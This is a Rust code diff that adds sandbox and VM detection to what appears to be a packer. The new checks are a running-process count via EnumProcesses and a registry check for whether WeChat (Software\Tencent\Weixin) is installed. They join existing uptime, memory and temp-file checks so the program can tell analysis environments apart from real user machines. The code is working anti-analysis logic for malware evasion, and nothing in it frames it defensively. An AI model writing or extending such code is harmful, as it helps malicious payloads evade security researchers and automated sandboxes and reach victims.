@@ -4,10 +4,13 @@ use windows_sys::Win32::Foundation::BOOL;
 use windows_sys::Win32::System::Diagnostics::Debug::{
     CheckRemoteDebuggerPresent, IsDebuggerPresent,
 };
+use windows_sys::Win32::System::ProcessStatus::EnumProcesses;
 use windows_sys::Win32::System::SystemInformation::{
     GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
 };
 use windows_sys::Win32::System::Threading::GetCurrentProcess;
+use winreg::enums::*;
+use winreg::RegKey;
 
 /// Aggregated anti-debug checks.
 pub fn anti_debug_triggered() -> bool {
@@ -32,6 +35,8 @@ pub fn anti_vm_triggered() -> bool {
     let up_ms = uptime_ms();
     let total_phys = total_physical_memory();
     let tmp_count = temp_file_count();
+    let proc_count = process_count();
+    let wechat_installed = is_wechat_installed();
 
     let min_up_ms = std::env::var("RS_PACK_MIN_UPTIME_MS")
         .ok()
@@ -46,11 +51,17 @@ pub fn anti_vm_triggered() -> bool {
         .ok()
         .and_then(|v| v.parse::<usize>().ok())
         .unwrap_or(30);
+    let min_procs = std::env::var("RS_PACK_MIN_PROCESSES")
+        .ok()
+        .and_then(|v| v.parse::<usize>().ok())
+        .unwrap_or(50);
 
     let conds = [
         up_ms < min_up_ms,
         total_phys < min_phys,
         tmp_count < min_tmp,
+        proc_count < min_procs,
+        !wechat_installed,
     ];
     conds.iter().filter(|&&b| b).count() >= 2
 }
@@ -76,4 +87,29 @@ pub fn temp_file_count() -> usize {
         Ok(rd) => rd.filter_map(|e| e.ok()).count(),
         Err(_) => 0,
     }
+}
+
+pub fn process_count() -> usize {
+    let mut pids = [0u32; 1024];
+    let mut bytes_returned = 0;
+    let ok = unsafe {
+        EnumProcesses(
+            pids.as_mut_ptr(),
+            (pids.len() * core::mem::size_of::<u32>()) as u32,
+            &mut bytes_returned,
+        )
+    };
+    if ok != 0 {
+        bytes_returned as usize / core::mem::size_of::<u32>()
+    } else {
+        0
+    }
+}
+
+pub fn is_wechat_installed() -> bool {
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    if let Ok(_) = hkcu.open_subkey("Software\\Tencent\\Weixin") {
+        return true;
+    }
+    false
 }
